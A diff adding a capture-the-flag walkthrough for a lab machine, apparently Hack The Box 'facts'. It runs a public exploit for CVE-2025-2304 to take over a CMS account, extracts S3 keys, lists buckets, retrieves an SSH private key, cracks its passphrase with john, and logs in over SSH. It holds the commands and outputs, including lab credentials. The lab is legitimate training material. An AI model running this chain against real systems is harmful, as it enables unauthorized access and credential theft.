@@ -1,0 +1,106 @@
+Source:     https://github.com/Alien0ne/CVE-2025-2304
+            https://www.youtube.com/watch?v=aBzJeG_fTuY
+
+
+########## FIND VERSION OF SERVICE ##########
+Version 2.9.0   # Found in the footer of admin panel
+
+
+########## LEVERAGE THE VULNERABILITY ##########
+$> cd CVE-2025-2304/
+$> python3 -m venv ./venv
+$> source venv/bin/activate
+$> pip3 install -r requirements.txt
+$> python3 exploit.py --url http://facts.htb -U attacker -P attacker --newpass attacker
+
+    NOTE: Now it is possible to enumerate all registered users, change their information,
+          change website contents, and many other things.
+
+
+########## LEAK AWS S3 CONFIGURATION ##########
+$> python3 exploit.py --url http://facts.htb -U attacker -P attacker --newpass attacker -e
+
+[+]Extracting S3 Credentials
+   s3 access key: AKIAE6F6E1C84A9AB98D
+   s3 secret key: lpD4d93j8WfQ5429QbLGBN2LlRTMSEW8KamYLrwX
+   s3 endpoint: http://localhost:54321
+
+    NOTE: It is possible to leak them also from the admin panel:
+          Dashboard > Settings > General Site > Filesystem Settings
+
+
+########## LEAK AWS S3 BUCKETS FROM VALID CONFIG CREDENTIALS ##########
+### CONFIGURE THE AWS CLI
+$> aws configure --profile facts-machine
+
+AWS Access Key ID [None]: AKIAE6F6E1C84A9AB98D
+AWS Secret Access Key [None]: lpD4d93j8WfQ5429QbLGBN2LlRTMSEW8KamYLrwX
+Default region name [None]: 
+Default output format [None]: 
+
+
+### ENUMERATE BUCKETS WITH CUSTOM ENDPOINT
+$> aws --profile facts-machine --endpoint-url http://10.129.31.198:54321 s3 ls
+2025-09-11 14:06:52 internal
+2025-09-11 14:06:52 randomfacts
+
+
+### LIST BUCKET CONTENT
+$> aws --profile facts-machine --endpoint-url http://10.129.31.198:54321 s3 ls s3://internal
+
+
+                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+2026-01-08 19:45:13        220 .bash_logout
+2026-01-08 19:45:13       3900 .bashrc
+2026-01-08 19:47:17         20 .lesshst
+2026-01-08 19:47:17        807 .profile
+
+
+### LIST FOLDER CONTENT
+$> aws --profile facts-machine --endpoint-url http://10.129.31.198:54321 s3 ls s3://internal/.ssh/
+
+2026-04-15 10:26:19         82 authorized_keys
+2026-04-15 10:26:19        464 id_ed25519
+
+    NOTE: By looking at the header in the key file (id_ed25519) we can see it's passphrase protected!
+
+
+### PREPARE THE KEY
+$> chmod 600 id_ed25519
+
+    NOTE: Ensure the permissions are restricted or SSH will reject the key for being "too open".
+
+$> ssh2john id_ed25519 > id_ed25519.hash
+$> john --wordlist=/home/thomas/Desktop/rockyou.txt id_ed25519.hash
+
+
+[ssh-opencl] cipher value of 6 is not yet supported with OpenCL!
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+
+dragonballz      (id_ed25519)
+
+1g 0:00:00:47 DONE (2026-04-15 15:17) 0.02122g/s 67.91p/s 67.91c/s 67.91C/s adriano..imissu
+Session completed.
+
+
+########## GET USERNAME BY EXTRACTING THE PUBLIC KEY FROM PRIVATE KEY ##########
+$> ssh-keygen -y -f id_ed25519
+
+
+Enter passphrase: dragonballz
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICRrejatRTMn8wyVW4ymqqBEJdqkzg0NGtuoOQroziAy trivia@facts.htb
+
+
+########## ACCESS TO SSH AS "TRIVIA" ##########
+$> ssh -i id_ed25519 trivia@10.129.31.198
+
+
+trivia@facts:~$
+
